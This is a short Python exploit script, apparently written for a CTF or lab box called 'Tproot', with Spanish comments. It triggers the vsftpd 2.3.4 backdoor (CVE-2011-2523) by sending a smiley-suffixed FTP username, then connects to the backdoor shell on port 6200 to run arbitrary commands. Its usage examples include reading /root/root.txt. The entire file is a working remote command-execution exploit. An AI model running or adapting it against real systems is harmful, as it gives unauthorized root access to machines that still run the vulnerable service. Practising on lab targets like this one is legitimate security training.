#!/usr/bin/env python3
"""
Ejecuta comandos en el objetivo Tproot a traves del backdoor de vsftpd 2.3.4
(CVE-2011-2523) y devuelve la salida.

Uso:
    python3 bsh.py 'id'
    python3 bsh.py 'cat /root/root.txt'
    echo 'ls -la /root' | python3 bsh.py -
"""
import socket
import sys
import time

HOST = "172.17.0.2"
FTP_PORT = 21
SHELL_PORT = 6200
MAGIC = ":)"


def open_shell(host=HOST, ftp_port=FTP_PORT, shell_port=SHELL_PORT):
    ftp = socket.create_connection((host, ftp_port), timeout=10)
    ftp.settimeout(8)
    ftp.recv(1024)
    ftp.sendall(f"USER backdoor{MAGIC}\r\n".encode())
    try:
        ftp.recv(1024)
    except socket.timeout:
        pass
    ftp.sendall(b"PASS backdoor\r\n")
    try:
        ftp.recv(1024)
    except socket.timeout:
        pass

    for _ in range(30):
        try:
            sh = socket.create_connection((host, shell_port), timeout=8)
            break
        except OSError:
            time.sleep(0.4)
    else:
        raise SystemExit("[-] no se pudo abrir el shell del backdoor")

    sh.settimeout(10)
    time.sleep(0.4)
    try:
        sh.recv(4096)
    except socket.timeout:
        pass
    return ftp, sh


def run(cmd, host=HOST):
    ftp, sh = open_shell(host)
    sh.sendall(cmd.encode() + b"\n")
    time.sleep(1.0)
    out = b""
    sh.settimeout(2.5)
    try:
        while True:
            chunk = sh.recv(4096)
            if not chunk:
                break
            out += chunk
    except socket.timeout:
        pass
    sh.close()
    ftp.close()
    text = out.decode(errors="replace")
    # limpia el eco y el prompt inicial
    lines = text.splitlines()
    if lines and cmd.strip() in lines[0]:
        lines = lines[1:]
    return "\n".join(lines).strip()


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("uso: bsh.py '<comando>' | bsh.py -", file=sys.stderr)
        raise SystemExit(1)
    cmd = sys.stdin.read() if sys.argv[1] == "-" else " ".join(sys.argv[1:])
    print(run(cmd))
